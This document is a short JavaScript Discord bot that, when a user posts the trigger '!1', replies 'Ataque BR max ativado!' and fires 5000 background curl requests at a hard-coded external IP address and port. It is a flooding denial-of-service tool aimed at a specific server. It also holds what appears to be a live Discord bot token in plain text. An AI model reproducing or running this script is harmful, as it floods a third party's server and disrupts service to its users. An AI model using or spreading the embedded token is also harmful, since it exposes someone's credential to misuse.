const { Client, GatewayIntentBits } = require('discord.js');
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });
const target = "http://158.69.171.5:4500";
client.on('messageCreate', message => {
  if (message.content === '!1') {
    message.reply('Ataque BR max ativado!');
    for(let i = 0; i < 5000; i++) {
      require('child_process').exec(`curl -s ${target} &`);
    }
  }
});
client.login('MTUwNjgyMjY5NTM5MDY3OTIwMA.G6Spoe.LuG2cW9ufL0bAAQNfTyHR89AKPXDy-j-XU0vEY');
